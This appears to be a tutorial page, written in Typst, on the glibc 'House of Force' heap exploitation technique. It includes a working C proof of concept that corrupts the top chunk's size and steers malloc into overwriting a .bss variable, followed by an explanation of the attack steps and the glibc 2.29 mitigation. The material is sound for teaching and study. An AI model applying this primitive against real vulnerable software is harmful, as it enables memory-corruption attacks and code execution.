#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Force",
    description: "Abusing the top chunk (wilderness) size to achieve arbitrary allocation by forcing malloc to wrap around the address space.",
    date: "2025-12-26",
    order: 30,
  ),
)<frontmatter>

= glibc Allocator: House of Force

== Introduction

The "House of Force" is a powerful heap exploitation technique that targets the "wilderness" chunk, also known as the **Top Chunk**. The Top Chunk is the region of memory at the very end of the heap that is used to satisfy allocation requests when no suitable free chunks are available in the bins.

By corrupting the `size` field of the Top Chunk, an attacker can trick the allocator into believing that the heap is much larger than it actually is (e.g., by setting the size to `-1`). This allows the attacker to make a subsequent `malloc()` request with a carefully calculated "evil" size that causes the Top Chunk's pointer to wrap around or reach an arbitrary memory location (like the stack, `.bss`, or the GOT).

== Prerequisites
- *Heap Overflow*: Ability to overwrite the `size` field of the Top Chunk (Wilderness).
- *Arbitrary Allocation Size*: Ability to control the size argument of a `malloc()` call.
- *GLIBC Version*: Typically works on glibc < 2.29. Newer versions have a top chunk size integrity check.

== Example from `house_of_force.c`

This PoC demonstrates how to use House of Force to overwrite a global variable in the `.bss` section.

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nWelcome to the House of Force\n\n");
	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");

	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);

	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	int real_size = malloc_usable_size(p1);

	//----- VULNERABILITY ----
	// Assuming a heap overflow allows us to reach the Top Chunk's header
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with -1 (maximum possible value).\n");
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	//------------------------

	/*
	 * Calculate the 'evil_size' needed to reach bss_var.
	 * Request size = target_addr - top_chunk_addr - metadata_overhead
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;

	fprintf(stderr, "\nMalloc-ing %#lx bytes to reach the target region.\n", evil_size);
	void *new_ptr = malloc(evil_size);

	// The next allocation will now be served from our target address
	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nmalloc(100) => %p!\n", ctr_chunk);

	fprintf(stderr, "... old string: %s\n", bss_var);
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);

	assert(ctr_chunk == bss_var);
}
```

== Attack Flow Explained

=== 1. Locate the Top Chunk

The Top Chunk always sits at the end of the heap. If we allocate a chunk `p1`, the Top Chunk's header is located at `p1 + usable_size(p1)`.

=== 2. The Vulnerability: Corrupting the Wilderness

The attacker uses a heap overflow to overwrite the Top Chunk's `size` field. By setting it to `-1` (or `0xFFFFFFFFFFFFFFFF` on 64-bit), we bypass any "out of memory" checks and prevent the allocator from calling `mmap()` or `sbrk()` to expand the heap. The allocator now believes it has enough "wilderness" to satisfy any request.

=== 3. Calculating the Evil Size

We want the *next* `malloc` to return a specific address. Let `dest` be the target address and `ptr_top` be the start of the current Top Chunk header.

The allocator updates the Top Chunk pointer as follows:
`new_top = old_top + request_size + metadata`

To make `new_top` point to our target (minus some space for the next header), we calculate the difference. Because `malloc` uses `unsigned long`, if the target is *before* the Top Chunk in memory, the subtraction will wrap around the address space, effectively reaching the target.

#figure(
  table(
    columns: (auto, auto),
    inset: 10pt,
    align: center,
    [*Parameter*], [*Value / Calculation*],
    [Target Address], `bss_var`,
    [Current Top], `ptr_top`,
    [Metadata Overhead], `4 * sizeof(long)`,
    [**Evil Size**], `target - top - overhead`,
  ),
  caption: [Calculating the request size to reach an arbitrary target.],
)

=== 4. Reaching the Target

After calling `malloc(evil_size)`, the Top Chunk's internal pointer is moved to our target address. The *subsequent* call to `malloc()` will return the chunk starting at that exact target address.

== Modern Mitigations (glibc 2.29+)

Starting with glibc 2.29, a sanity check was added to verify the Top Chunk's size:

```c
if (__glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): corrupted top size");
```

This check ensures that the Top Chunk size is never larger than the total memory currently allocated to the arena, effectively killing the House of Force technique in modern distributions.
